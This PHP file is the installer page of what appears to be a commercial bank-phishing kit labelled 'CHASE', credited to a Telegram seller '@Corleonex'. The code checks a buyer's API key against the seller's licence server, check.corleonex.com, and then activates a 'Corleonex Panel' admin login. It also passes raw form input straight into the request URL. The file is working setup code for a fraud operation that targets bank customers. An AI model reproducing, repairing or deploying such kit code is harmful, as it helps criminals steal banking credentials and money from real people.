<?php 
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");

/**
 * CHASE -
 * version 1.0
 * telegram = @Corleonex


   _____           _                            
  / ____|         | |                           
 | |     ___  _ __| | ___  ___  _ __   _____  __
 | |    / _ \| '__| |/ _ \/ _ \| '_ \ / _ \ \/ /
 | |___| (_) | |  | |  __/ (_) | | | |  __/>  < 
  \_____\___/|_|  |_|\___|\___/|_| |_|\___/_/\_\
                                                
                                                
" There's no nobility in poverty.
  I've been a poor man,
  and I've been a rich man.
   And I choose rich every fucking time. "

**/

if(isset($_POST['Submit'])){
include 'YOUR-CONFIG.php';


}


/* Starts the session */
if(isset($_POST['Submit'])){


 $handle = curl_init();
 
$url = 'https://check.corleonex.com/check.php?check=' . $_POST['apikey'];
 
// Set the url
curl_setopt($handle, CURLOPT_URL, $url);
// Set the result output to be a string.
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
 
$output = curl_exec($handle);
 
curl_close($handle);

 
if (  $output  == 'good'){

   $user = $data->where( '_id', '=',  5 );

        $user->update( [
          'installed' => 'yes' ,
          'apikey' => $_POST['apikey'] , 
        ] );

          header('Location: login.php');


} else {

  $msg = "<center><p> you api key is wrong ! </p></center>";

}
}
?>
<link rel="stylesheet" type="text/css" href="files/admin/css/login.css">
<link rel="stylesheet" type="text/css" href="toastr.css
">
<div class="background-wrap">
  <div class="background"></div>
</div>
<center>
	<img style="width: 20%;" src="files/admin/logo.jpg">

</center>
<form id="accesspanel" action="install.php" method="post">

  <h1 id="litheader">Corleonex Panel  <font style="color:transparent;font-size:0px"></font></h1>
  <h1 id="litheader">Put your api :   <font style="color:transparent;font-size:0px"></font></h1>

  <center>
  <?php 
if(isset($msg)){
echo $msg;
}
?>
</center>
  <div class="inset">
    <p>
      <input type="text" name="apikey" id="apikey" placeholder="apikey">
    </p>

  </div>
  <p class="p-container">
    <input name="Submit" type="submit" value="INSTALL" id="go" value="Authorize">
  </p>
</form>
